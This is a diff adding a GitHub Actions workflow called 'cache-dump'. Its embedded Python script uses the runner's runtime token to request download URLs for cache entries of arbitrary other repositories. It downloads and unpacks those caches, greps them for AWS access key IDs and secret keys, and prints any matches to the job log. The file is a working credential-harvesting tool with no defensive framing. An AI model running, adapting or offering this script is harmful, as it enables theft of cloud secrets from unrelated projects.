@@ -1,0 +1,62 @@
+name: cache-dump
+on:
+  workflow_dispatch:
+    inputs:
+      jobs_json:
+        description: JSON list of {id,owner,repo,key,version,ref,size}
+        required: true
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    timeout-minutes: 240
+    steps:
+      - name: fetch-grep
+        env:
+          ITEMS: ${{ inputs.jobs_json }}
+        run: |
+          set -u
+          python3 - <<'PY'
+          import json,os,urllib.request,subprocess,shutil
+          base=(os.environ.get('ACTIONS_RESULTS_URL') or os.environ.get('ACTIONS_CACHE_URL') or '').rstrip('/')
+          token=os.environ['ACTIONS_RUNTIME_TOKEN']
+          items=json.loads(os.environ['ITEMS'])
+          print('base',base)
+          for it in items:
+              cid=it['id']; owner=it['owner']; repo=it['repo']
+              print('===CACHE',cid,owner+'/'+repo,it['ref'],it['size'],it['key'][:80],flush=True)
+              try:
+                  body=json.dumps({"metadata":{"scope":{"owner":owner,"repository":repo,"ref":it['ref']},"cacheSize":int(it['size'])},"key":it['key'],"version":it['version']}).encode()
+                  req=urllib.request.Request(base+"/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL",data=body,headers={"Authorization":"Bearer "+token,"Content-Type":"application/json"})
+                  d=json.load(urllib.request.urlopen(req,timeout=120))
+                  url=d.get('signedDownloadUrl') or d.get('signed_download_url')
+                  if not url:
+                      print('===ERR',cid,'nourl',json.dumps(d)[:300]); continue
+              except Exception as e:
+                  print('===ERR',cid,'twirp',repr(e)[:300]); continue
+              shutil.rmtree('/tmp/x',ignore_errors=True); os.makedirs('/tmp/x',exist_ok=True)
+              try:
+                  subprocess.run(['curl','-sSL','--max-time','1200','-o','/tmp/c',url],check=True)
+              except Exception as e:
+                  print('===ERR',cid,'dl',repr(e)[:200]); continue
+              ext=''
+              for cmd in (['tar','--zstd','-xf','/tmp/c','-C','/tmp/x'],['tar','-xf','/tmp/c','-C','/tmp/x'],['bash','-c','zstd -dc /tmp/c 2>/dev/null | tar -xf - -C /tmp/x']):
+                  r=subprocess.run(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+                  if r.returncode==0: ext='ok'; break
+              if not ext:
+                  print('===ERR',cid,'extract'); continue
+              n=sum(len(f) for _,_,f in os.walk('/tmp/x'))
+              print('===EXTRACT',cid,'files',n,flush=True)
+              try:
+                  out=subprocess.run(['rg','-a','-n','--no-messages','--max-count','30','-e','AKIA[0-9A-Z]{16}','-e','ASIA[0-9A-Z]{16}','-e','aws_secret_access_key','-e','aws_access_key_id','/tmp/x'],capture_output=True,text=True,timeout=900).stdout
+              except Exception as e:
+                  print('===ERR',cid,'rg',repr(e)[:200]); out=''
+              hits=[l for l in out.splitlines() if l.strip()]
+              if hits:
+                  print('===HITS',cid,len(hits))
+                  print('\n'.join(hits[:120]))
+              else:
+                  print('===NOHIT',cid)
+              print('===END',cid,flush=True)
+              os.remove('/tmp/c')
+          print('===ALLDONE')
+          PY
